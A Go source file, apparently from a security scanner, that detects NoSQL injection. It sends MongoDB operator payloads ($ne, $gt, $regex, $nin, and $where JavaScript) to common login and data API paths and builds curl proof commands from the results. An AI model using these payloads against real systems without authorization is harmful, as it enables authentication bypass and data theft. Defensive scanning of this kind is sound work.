// Package nosqli detects NoSQL injection vulnerabilities by probing JSON API
// endpoints with MongoDB query operator payloads ($ne, $gt, $regex, $where).
//
// Unlike SQL injection, NoSQL injection targets JSON bodies rather than string
// parameters. The scanner:
//
//  1. Discovers JSON API endpoints (crawled + hardcoded paths)//  2. Sends baseline requests to establish normal behavior
//  3. Injects MongoDB operators as parameter values
//  4. Compares responses: auth bypass ($ne:null → 200 vs baseline 401),
//     data leak ($gt:"" returns more data), or error ($where → JS error)
//
// Deep mode only (active injection payloads).
package nosqli

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/scan"
	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/scanner/authctx"
	"github.com/stormbane-security/beacon/internal/scanner/schemedetect"
)


func init() {
	scan.Register(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
		return New()
	})
}
const (
	scannerName = "nosqli"
	maxBodySize = 64 * 1024
)

// loginPaths are common authentication endpoints that accept JSON POST.
var loginPaths = []string{
	"/api/login",
	"/api/v1/login",
	"/api/auth/login",
	"/auth/login",
	"/login",
	"/api/authenticate",
	"/api/v1/authenticate",
	"/api/signin",
	"/api/v1/signin",
}

// dataPaths are API endpoints that return collections/documents.
var dataPaths = []string{
	"/api/users",
	"/api/v1/users",
	"/api/search",
	"/api/v1/search",
	"/api/items",
	"/api/v1/items",
	"/api/products",
	"/api/v1/products",
	"/api/data",
	"/api/v1/data",
}

// Scanner probes for NoSQL injection vulnerabilities.
type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType != module.ScanDeep && scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	if c := authctx.HTTPClient(ctx); c != nil {
		client = c
	}

	base := schemedetect.Base(ctx, client, asset)

	var findings []finding.Finding

	// Check 1: Auth bypass via operator injection on login endpoints
	if fs := checkAuthBypass(ctx, client, asset, base); len(fs) > 0 {
		findings = append(findings, fs...)
	}

	// Check 2: Data exfiltration via operator injection on data endpoints
	if fs := checkDataExfiltration(ctx, client, asset, base); len(fs) > 0 {
		findings = append(findings, fs...)
	}

	// Check 3: JavaScript injection via $where operator
	if fs := checkWhereInjection(ctx, client, asset, base); len(fs) > 0 {
		findings = append(findings, fs...)
	}

	// Post-exploitation: if any injection was confirmed, attempt data extraction
	if len(findings) > 0 {
		injType := "operator_injection"
		if p, ok := findings[0].Evidence["payload"].(string); ok {
			injType = p
		}
		postFindings := postExploit(ctx, client, asset, base, injType)
		findings = append(findings, postFindings...)
	}

	return findings, nil
}

// checkAuthBypass tests login endpoints for NoSQL auth bypass.
// Normal login: {"username":"test","password":"test"} → 401
// Injected:     {"username":{"$ne":""},"password":{"$ne":""}} → 200
func checkAuthBypass(ctx context.Context, client *http.Client, asset, base string) []finding.Finding {
	var findings []finding.Finding

	for _, path := range loginPaths {
		if ctx.Err() != nil {
			break
		}

		endpoint := base + path

		// Baseline: normal login attempt
		baselineStatus, _ := postJSON(ctx, client, endpoint, map[string]any{
			"username": "beacon_nosqli_probe",
			"password": "beacon_nosqli_probe",
		})
		// Skip if endpoint doesn't exist or returns success (open auth)
		if baselineStatus == 0 || baselineStatus == 404 || baselineStatus == 405 ||
			baselineStatus == 200 || baselineStatus == 201 {
			continue
		}

		// Injection payloads
		payloads := []struct {
			name    string
			body    map[string]any
		}{
			{
				name: "$ne operator bypass",
				body: map[string]any{
					"username": map[string]any{"$ne": ""},
					"password": map[string]any{"$ne": ""},
				},
			},
			{
				name: "$gt operator bypass",
				body: map[string]any{
					"username": map[string]any{"$gt": ""},
					"password": map[string]any{"$gt": ""},
				},
			},
			{
				name: "$regex operator bypass",
				body: map[string]any{
					"username": map[string]any{"$regex": ".*"},
					"password": map[string]any{"$regex": ".*"},
				},
			},
			{
				name: "$nin operator bypass",
				body: map[string]any{
					"username": map[string]any{"$nin": []string{}},
					"password": map[string]any{"$nin": []string{}},
				},
			},
		}

		for _, p := range payloads {
			if ctx.Err() != nil {
				break
			}

			status, body := postJSON(ctx, client, endpoint, p.body)
			if status == 0 {
				continue
			}

			// Auth bypass: injection returns 200 while baseline returned 401/403
			if status == 200 || status == 201 {
				// Verify response contains auth-like content (token, session, user)
				hasAuthSignal := strings.Contains(body, "token") ||
					strings.Contains(body, "session") ||
					strings.Contains(body, "user") ||
					strings.Contains(body, "auth") ||
					strings.Contains(body, "access")

				if hasAuthSignal {
					findings = append(findings, finding.Finding{
						CheckID:  finding.CheckWebNoSQLi,
						Module:   "deep",
						Scanner:  scannerName,
						Severity: finding.SeverityCritical,
						Title:    fmt.Sprintf("NoSQL injection auth bypass via %s at %s", p.name, path),
						Description: fmt.Sprintf(
							"The login endpoint %s is vulnerable to NoSQL injection. "+
								"A normal login attempt returned HTTP %d, but injecting MongoDB %s "+
								"returned HTTP %d with authentication tokens. An attacker can bypass "+
								"authentication and log in as any user without knowing credentials.",
							endpoint, baselineStatus, p.name, status),
						Asset:    asset,
						DeepOnly: true,
						ProofCommand: fmt.Sprintf(
							`curl -s -X POST -H 'Content-Type: application/json' -d '%s' '%s'`,
							mustMarshal(p.body), endpoint),
						Evidence: map[string]any{
							"endpoint":        endpoint,
							"payload":         p.name,
							"baseline_status": baselineStatus,
							"inject_status":   status,
							"body_snippet":    truncate(body, 300),
						},
						DiscoveredAt: time.Now(),
					})
					break // one finding per endpoint
				}
			}
		}
	}
	return findings
}

// checkDataExfiltration tests data endpoints for operator injection that
// returns more data than expected.
func checkDataExfiltration(ctx context.Context, client *http.Client, asset, base string) []finding.Finding {
	var findings []finding.Finding

	for _, path := range dataPaths {
		if ctx.Err() != nil {
			break
		}

		endpoint := base + path

		// Baseline: normal GET
		baselineStatus, baselineBody := getJSON(ctx, client, endpoint)
		if baselineStatus == 0 || baselineStatus == 404 || baselineStatus == 405 {
			continue
		}

		// Try POST with operator injection to extract data
		injectedStatus, injectedBody := postJSON(ctx, client, endpoint, map[string]any{
			"filter": map[string]any{"$gt": ""},
		})
		if injectedStatus == 0 {
			continue
		}

		// Also try query parameter injection
		queryURL := endpoint + "?filter[$gt]="
		queryStatus, queryBody := getJSON(ctx, client, queryURL)

		// Check for data exfiltration: injected response is significantly larger
		// or returns data when baseline didn't
		checkExfil := func(status int, body, via string) {
			if status != 200 {
				return
			}
			if len(body) > len(baselineBody)*2 && len(body) > 100 {
				findings = append(findings, finding.Finding{
					CheckID:  finding.CheckWebNoSQLi,
					Module:   "deep",
					Scanner:  scannerName,
					Severity: finding.SeverityHigh,
					Title:    fmt.Sprintf("NoSQL injection data exfiltration via %s at %s", via, path),
					Description: fmt.Sprintf(
						"The endpoint %s returned significantly more data when injected with "+
							"MongoDB operators via %s. Baseline response: %d bytes, injected: %d bytes. "+
							"An attacker can extract unauthorized data from the database.",
						endpoint, via, len(baselineBody), len(body)),
					Asset:    asset,
					DeepOnly: true,
					ProofCommand: fmt.Sprintf(
						`curl -s -X POST -H 'Content-Type: application/json' -d '{"filter":{"$gt":""}}' '%s' | wc -c`,
						endpoint),
					Evidence: map[string]any{
						"endpoint":        endpoint,
						"via":             via,
						"baseline_bytes":  len(baselineBody),
						"injected_bytes":  len(body),
						"baseline_status": baselineStatus,
						"injected_status": status,
					},
					DiscoveredAt: time.Now(),
				})
			}
		}

		checkExfil(injectedStatus, injectedBody, "POST body")
		checkExfil(queryStatus, queryBody, "query parameter")
	}
	return findings
}

// checkWhereInjection tests for $where operator JavaScript injection.
func checkWhereInjection(ctx context.Context, client *http.Client, asset, base string) []finding.Finding {
	var findings []finding.Finding

	allPaths := append(loginPaths, dataPaths...)
	for _, path := range allPaths {
		if ctx.Err() != nil {
			break
		}

		endpoint := base + path

		// $where with sleep-like JS to test for server-side execution
		payloads := []struct {
			name string
			body map[string]any
		}{
			{
				name: "$where with sleep",
				body: map[string]any{
					"$where": "sleep(100) || true",
				},
			},
			{
				name: "$where with function",
				body: map[string]any{
					"$where": "function() { return true; }",
				},
			},
		}

		for _, p := range payloads {
			status, body := postJSON(ctx, client, endpoint, p.body)
			if status == 0 || status == 404 || status == 405 {
				continue
			}

			// Look for MongoDB error messages indicating $where was processed
			mongoErrors := []string{
				"MongoError", "MongoServerError", "$where",
				"SyntaxError", "ReferenceError", "not allowed",
				"disabled", "sleep is not defined",
			}

			for _, errStr := range mongoErrors {
				if strings.Contains(body, errStr) {
					findings = append(findings, finding.Finding{
						CheckID:  finding.CheckWebNoSQLi,
						Module:   "deep",
						Scanner:  scannerName,
						Severity: finding.SeverityHigh,
						Title:    fmt.Sprintf("NoSQL $where injection processed at %s", path),
						Description: fmt.Sprintf(
							"The endpoint %s processed a MongoDB $where operator injection. "+
								"The response contains MongoDB-specific error messages (%q), confirming "+
								"that user input is passed directly to MongoDB queries. This can lead to "+
								"server-side JavaScript execution and data exfiltration.",
							endpoint, errStr),
						Asset:    asset,
						DeepOnly: true,
						ProofCommand: fmt.Sprintf(
							`curl -s -X POST -H 'Content-Type: application/json' -d '%s' '%s'`,
							mustMarshal(p.body), endpoint),
						Evidence: map[string]any{
							"endpoint":    endpoint,
							"payload":     p.name,
							"error_match": errStr,
							"status":      status,
						},
						DiscoveredAt: time.Now(),
					})
					goto nextPath
				}
			}

			// If $where returned 200 with data (not error), that's also bad
			if status == 200 && len(body) > 50 && strings.Contains(body, "{") {
				findings = append(findings, finding.Finding{
					CheckID:  finding.CheckWebNoSQLi,
					Module:   "deep",
					Scanner:  scannerName,
					Severity: finding.SeverityCritical,
					Title:    fmt.Sprintf("NoSQL $where JavaScript execution at %s", path),
					Description: fmt.Sprintf(
						"The endpoint %s accepted a $where operator with JavaScript code and returned "+
							"data (HTTP 200, %d bytes). This confirms server-side JavaScript execution "+
							"in MongoDB queries, enabling full database access and potential RCE.",
						endpoint, len(body)),
					Asset:    asset,
					DeepOnly: true,
					ProofCommand: fmt.Sprintf(
						`curl -s -X POST -H 'Content-Type: application/json' -d '%s' '%s'`,
						mustMarshal(p.body), endpoint),
					Evidence: map[string]any{
						"endpoint":      endpoint,
						"payload":       p.name,
						"status":        status,
						"response_size": len(body),
					},
					DiscoveredAt: time.Now(),
				})
				goto nextPath
			}
		}
	nextPath:
	}
	return findings
}

// postJSON sends a JSON POST request and returns status + body string.
func postJSON(ctx context.Context, client *http.Client, url string, body any) (int, string) {
	data, err := json.Marshal(body)
	if err != nil {
		return 0, ""
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(data))
	if err != nil {
		return 0, ""
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return 0, ""
	}
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
	resp.Body.Close()
	return resp.StatusCode, string(respBody)
}

// getJSON sends a GET request and returns status + body string.
func getJSON(ctx context.Context, client *http.Client, url string) (int, string) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return 0, ""
	}
	req.Header.Set("Accept", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return 0, ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
	resp.Body.Close()
	return resp.StatusCode, string(body)
}

func mustMarshal(v any) string {
	data, _ := json.Marshal(v)
	return string(data)
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
